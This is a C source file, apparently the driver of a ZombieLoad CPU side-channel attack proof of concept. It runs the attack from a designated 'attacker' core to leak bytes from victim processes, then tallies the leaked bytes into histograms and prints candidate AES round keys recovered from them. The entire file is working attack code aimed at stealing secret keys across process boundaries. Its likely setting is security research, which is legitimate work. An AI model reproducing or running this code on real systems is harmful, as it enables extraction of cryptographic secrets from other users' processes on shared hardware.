#include "main.h"

sample* samples;
size_t num_samples = 200000;

int main(int argc, char* argv[]) {
	// ################
	//  Initialization
	// ################

	// Set stdout unbuffered (avoids problems when redirecting stdout to a file)
	setbuf(stdout, NULL);

	// Parse Command line arguments: 1st argument overrides num_samples.
	if (argc == 2) {
		if (sscanf(argv[1], "%zu", &num_samples) != 1){
			puts("Invalid command line argument");
			exit(1);
		}
	}
	printf("[MA] Will collect %zu samples.\n", num_samples);

	// Execute main process on specific (logical) CPU core
	if (move_process_to_cpu(getpid(), CPU_ATTACKER) != 0) {
		puts("[MA] Error moving main process");
		exit(1);
	}
	printf("[MA] Main process (%d) is running on CPU %d\n", getpid(), sched_getcpu());

	// Initialize PRNG (DEBUG: constant value)
	srand(17);

	// Allocate memory for samples
	samples = calloc(num_samples, sizeof(sample));
	if (!samples) {
		puts("[MA] Could not allocate memory for samples.");
		exit(1);
	}

	// ############################
	//  Collect ZombieLoad samples
	// ############################
	// This procedure constantly repeats the ZombieLoad attack
	// and also controls the execution of the victim processes.
	// Bytes are leaked from varying positions (byte indices).

	// Save timestamp before sampling
	struct timeval time_start, time_end, time_duration;
	gettimeofday(&time_start, NULL);

	// Collect samples
	zombieload_collect_samples_v1(samples);

	// Save timestamp after sampling and print duration and sampling rate
	gettimeofday(&time_end, NULL);
	timersub(&time_end, &time_start, &time_duration);
	double duration = (double)(time_duration.tv_sec) + (double)(time_duration.tv_usec) / 1000000;

	// ##########
	//  Analysis
	// ##########
	// Now that we have collected many data samples, we have to analyse them to
	// extract the secret key.

	puts("[MA] Analysis...");

	uint8_t* potential_rk = (uint8_t*)malloc(sizeof(uint8_t) * NUM_FINGERPRINTS * KEY_LENGTH * (NUM_POSITIONS / KEY_LENGTH));
	size_t potential_rk_count = 0;

	// Initialize analysis array to store intermediate results
	// * 1st level: fingerprint
	// * 2nd level: type
	// * 3rd level: leaked byte (later: rank)
	for (size_t fingerprint = 0; fingerprint < NUM_FINGERPRINTS; fingerprint++) {
		hist_elem hist[NUM_POSITIONS][NUM_BYTES];

		for (size_t i = 0; i < NUM_POSITIONS; i++) {
			for (size_t j = 0; j < NUM_BYTES; j++) {
				hist[i][j].byte = j;
				hist[i][j].count = 0;
			}
		}
		
		// Go through all samples and count byte occurrences per type.
		for (size_t i = 0; i < num_samples; i++) {
			if (samples[i].fingerprint == fingerprint) {
				// increase counter
				hist[samples[i].pos][samples[i].byte].count += 1;
			}
		}

		puts("[MA] Counted samples. Results:");

		// Print some statistics:
		for (size_t i = 0; i < NUM_POSITIONS; i++) { // for each type
			for (size_t j = 0; j < NUM_BYTES; j++) { // for each possible byte value
				// if byte k occured for this type and fingerprint
				if (hist[i][j].count > 0) {
					// print the counter
					printf("[MA] FP %2zu Type %2zu Byte %.2zx Count %4d\n", fingerprint, i, j, hist[i][j].count);
				}
			}
		}

		printf("[MA] Sorted Results (Top %d):\n", NUM_RANKING);

		// For each type, find the NUM_RANKING (5) most probable byte values.
		// To do so, sort hist's 2nd level: For each type, sort the NUM_BYTES (256)
		// counters in descending order. Then, print the NUM_RANKING (5) most frequent bytes.
		for (size_t i = 0; i < NUM_POSITIONS; i++) {
			qsort(hist[i], NUM_BYTES, sizeof(hist_elem), compare_hist_elem_by_count_desc);
			if (hist[i][0].count != 0) {
				printf("[MA] Type %2zu: ", i);
				for (size_t j = 0; j < NUM_RANKING; j++) {
					if (hist[i][j].count != 0) {
						printf(" %.2x  (%4d) ", hist[i][j].byte, hist[i][j].count);
					} else {
						printf(" ---------- ");
					}
				}
				puts("");
			}
		}

		// Extract possible AES keys
		for (size_t offset = 0; offset < NUM_POSITIONS; offset += KEY_LENGTH) {
			// if all positions 0..15 are set
			uint8_t empty_entry_exists = 0;
			for (size_t i = offset; i < (offset + KEY_LENGTH); i++) {
				if (hist[i][0].count == 0) {
					empty_entry_exists = 1;
					break;
				}
			}
			if (!empty_entry_exists) {
				for (size_t i = 0; i < KEY_LENGTH; i++) {
					*(potential_rk + KEY_LENGTH * potential_rk_count + i) = hist[offset+i][0].byte;
				}
				potential_rk_count++;
			}
		}
	}
	printf("%zu AES Round Key candidates found.\n", potential_rk_count);

	// Find possible AES keys
	for (size_t i = 0; i < potential_rk_count; i++) {
		printf("Possible Candidate: ");
		print_aes_key(potential_rk + KEY_LENGTH*i);
		for (size_t j = 0; j < potential_rk_count; j++) {
			if (i == j) {
				continue;
			}
			check_pair_oneway(potential_rk + KEY_LENGTH*i, potential_rk + KEY_LENGTH*j);
		}
	}

	// ###################
	//  Exit Main Process
	// ###################

	free(potential_rk);
	free(samples);

	printf("[MA] Collected %zu samples in %lf seconds (%lf samples/s).\n", num_samples, duration, num_samples / duration);
	puts("[MA] Process execution finished");
	
	return 0;
}
